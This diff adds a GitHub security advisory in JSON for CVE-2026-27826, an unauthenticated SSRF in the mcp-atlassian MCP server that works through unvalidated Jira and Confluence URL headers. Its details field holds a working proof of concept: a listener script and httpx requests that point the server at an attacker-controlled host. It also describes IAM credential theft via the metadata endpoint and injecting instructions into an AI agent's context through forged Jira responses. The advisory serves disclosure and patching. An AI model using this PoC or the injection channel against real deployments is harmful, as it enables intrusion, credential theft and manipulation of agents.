@@ -1,0 +1,122 @@
+{
+  "id": "GHSA-7r34-79r5-rcc9",
+  "modified": "2026-03-10T19:01:34.061559Z",
+  "published": "2026-03-10T18:48:46Z",
+  "aliases": [
+    "CVE-2026-27826"
+  ],
+  "summary": "MCP Atlassian has SSRF via unvalidated X-Atlassian-Jira-Url / X-Atlassian-Confluence-Url headers",
+  "details": "### Summary\nAn unauthenticated attacker who can reach the mcp-atlassian HTTP endpoint can force the server process to make outbound HTTP requests to an arbitrary attacker-controlled URL by supplying two custom HTTP headers without an `Authorization` header. No authentication is required. The vulnerability exists in the HTTP middleware and dependency injection layer — not in any MCP tool handler - making it invisible to tool-level code analysis. In cloud deployments, this could enable theft of IAM role credentials via the instance metadata endpoint (`169.254.169.254`). In any HTTP deployment it enables internal network reconnaissance and injection of attacker-controlled content into LLM tool results.\n\n### Details\nThe server supports a multi-tenant HTTP authentication mode where clients supply per-request Jira/Confluence URLs via custom headers. The middleware (`src/mcp_atlassian/servers/main.py:436–448`) extracts `X-Atlassian-Jira-Url` from the request and stores it in request state with no validation. The dependency provider (`src/mcp_atlassian/servers/dependencies.py:189–217`) then uses this value directly as the `url=` parameter when constructing a `JiraConfig` and `JiraFetcher`. The first method call on the fetcher (`get_current_user_account_id()`) immediately issues a `GET` request to `{header_url}/rest/api/2/myself` — an outbound SSRF call to the attacker-controlled URL.\n\nNo comparison is made against the server-configured `JIRA_URL` environment variable. No private IP range blocklist is applied. No URL scheme allowlist is enforced.\n\n  **Trigger conditions — all four must hold:**\n  1. Server running with `--transport streamable-http` or `--transport sse`\n  2. Request contains `X-Atlassian-Jira-Url` header (any non-empty value)\n  3. Request contains `X-Atlassian-Jira-Personal-Token` header (any non-empty value)\n  4. Request has **no** `Authorization` header\n\n  An identical vulnerability exists for Confluence at `dependencies.py:341–393` via `X-Atlassian-Confluence-Url` +\n  `X-Atlassian-Confluence-Personal-Token`.\n\n  **Root cause - middleware** (`src/mcp_atlassian/servers/main.py:436–448`):\n  ```python\n  # When service headers are present and no Authorization header is provided,\n  # auth type is set to \"pat\" but user_atlassian_token is NOT set.\n  # This is what routes execution to the vulnerable path below.\n  if service_headers and (jira_token_str and jira_url_str):\n      scope[\"state\"][\"user_atlassian_auth_type\"] = \"pat\"\n\n  Root cause - dependency provider (src/mcp_atlassian/servers/dependencies.py:189–217):\n  if (\n      user_auth_type == \"pat\"\n      and jira_url_header           # attacker-controlled, no validation\n      and jira_token_header\n      and not hasattr(request.state, \"user_atlassian_token\")\n  ):\n      header_config = JiraConfig(\n          url=jira_url_header,      # used directly, no allowlist check\n          personal_token=jira_token_header,\n          ...\n      )\n      header_jira_fetcher = JiraFetcher(config=header_config)\n      header_jira_fetcher.get_current_user_account_id()\n      # ^ GET {jira_url_header}/rest/api/2/myself — outbound SSRF call\n      request.state.jira_fetcher = header_jira_fetcher  # cached for all tool calls this request\n\n\n### PoC\nStep 1 - Start a listener to capture the inbound SSRF request:\n\n  # listener.py\n  from http.server import HTTPServer, BaseHTTPRequestHandler\n  import json, sys\n\n  class Handler(BaseHTTPRequestHandler):\n      def do_GET(self):\n          print(f\"[SSRF RECEIVED] Path: {self.path}\", file=sys.stderr)\n          print(f\"[SSRF RECEIVED] Headers: {dict(self.headers)}\", file=sys.stderr)\n          self.send_response(200)\n          self.send_header(\"Content-Type\", \"application/json\")\n          self.end_headers()\n          if \"myself\" in self.path:\n              self.wfile.write(json.dumps({\n                  \"accountId\": \"ssrf-confirmed\",\n                  \"displayName\": \"SSRF PoC\"\n              }).encode())\n          else:\n              self.wfile.write(b\"{}\")\n      def log_message(self, *args): pass\n\n  HTTPServer((\"0.0.0.0\", 8888), Handler).serve_forever()\n\nStep 2 - Start mcp-atlassian in HTTP transport mode (placeholder credentials are sufficient — the vulnerable path is reached before any real Atlassian instance is contacted):\n\n  JIRA_URL=https://placeholder.atlassian.net \\\n  JIRA_API_TOKEN=placeholder \\\n  mcp-atlassian --transport streamable-http --port 8000\n\n  Step 3 — Trigger the SSRF:\n\n  import httpx, json\n\n  MCP    = \"http://localhost:8000/mcp\"\n  ATTACK = \"http://\u003clistener-ip\u003e:8888\"\n\n  # Initialize MCP session\n  r = httpx.post(MCP, json={\n      \"jsonrpc\": \"2.0\", \"method\": \"initialize\",\n      \"params\": {\"protocolVersion\": \"2024-11-05\", \"capabilities\": {},\n                 \"clientInfo\": {\"name\": \"poc\", \"version\": \"1.0\"}},\n      \"id\": 1\n  }, headers={\n      \"X-Atlassian-Jira-Url\": ATTACK,\n      \"X-Atlassian-Jira-Personal-Token\": \"any-value\",\n      # No Authorization header — this is the key condition\n  })\n  sid = r.headers.get(\"mcp-session-id\")\n\n  # Call any Jira tool — this triggers get_jira_fetcher() and the outbound SSRF call\n  httpx.post(MCP, json={\n      \"jsonrpc\": \"2.0\", \"method\": \"tools/call\",\n      \"params\": {\"name\": \"jira_get_issue\", \"arguments\": {\"issue_key\": \"PROJ-1\"}},\n      \"id\": 2\n  }, headers={\n      \"X-Atlassian-Jira-Url\": ATTACK,\n      \"X-Atlassian-Jira-Personal-Token\": \"any-value\",\n      \"Mcp-Session-Id\": sid,\n  })\n\n  The listener will receive GET /rest/api/2/myself originating from the MCP server process, confirming the SSRF.\n\n\n### Impact\nThis vulnerability affects any deployment using `--transport streamable-http` or `--transport sse`. The default HOST=0.0.0.0 binding exposes the HTTP endpoint to any host on the same network without any configuration change, and to the internet when deployed on a cloud instance.\n\n  - Any HTTP deployment: The server acts as an SSRF proxy, enabling reconnaissance of internal services (databases, internal APIs, microservices)\n  not directly reachable from outside the network.\n  - AI agent sessions: Once the attacker-controlled fetcher is cached in request.state, all Jira tool responses for that session originate from the attacker's server. The attacker can return crafted API responses containing LLM instructions, injecting those instructions into the AI agent's context as if they were legitimate Jira data - a prompt injection channel at the data layer requiring no tool parameter manipulation.\n  - Cloud deployments: Any network-reachable attacker can potentially steal the server's IAM role credentials via the instance metadata service, gaining full access to all cloud resources that role permits.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "mcp-atlassian",
+        "purl": "pkg:pypi/mcp-atlassian"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.17.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.1",
+        "0.1.10",
+        "0.1.11",
+        "0.1.12",
+        "0.1.13",
+        "0.1.14",
+        "0.1.15",
+        "0.1.16",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9",
+        "0.10.0",
+        "0.10.1",
+        "0.10.2",
+        "0.10.3",
+        "0.10.4",
+        "0.10.5",
+        "0.10.6",
+        "0.11.0",
+        "0.11.1",
+        "0.11.10",
+        "0.11.11",
+        "0.11.12",
+        "0.11.2",
+        "0.11.2a2",
+        "0.11.3",
+        "0.11.4",
+        "0.11.5",
+        "0.11.6",
+        "0.11.7",
+        "0.11.8",
+        "0.11.9",
+        "0.12.0",
+        "0.13.0",
+        "0.13.1",
+        "0.14.0",
+        "0.14.1",
+        "0.14.2",
+        "0.14.3",
+        "0.15.0",
+        "0.16.0",
+        "0.16.1",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.2.3",
+        "0.2.4",
+        "0.2.5",
+        "0.2.6",
+        "0.3.0",
+        "0.3.1",
+        "0.4.0",
+        "0.5.0",
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.6.3",
+        "0.6.4",
+        "0.6.5",
+        "0.7.0",
+        "0.7.1",
+        "0.8.0",
+        "0.8.1",
+        "0.8.2",
+        "0.8.3",
+        "0.8.4",
+        "0.9.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-7r34-79r5-rcc9/GHSA-7r34-79r5-rcc9.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/sooperset/mcp-atlassian/security/advisories/GHSA-7r34-79r5-rcc9"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/sooperset/mcp-atlassian/commit/5cd697dfce9116ef330b8dc7a91291640e0528d9"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/sooperset/mcp-atlassian"
+    }
+  ]
+}
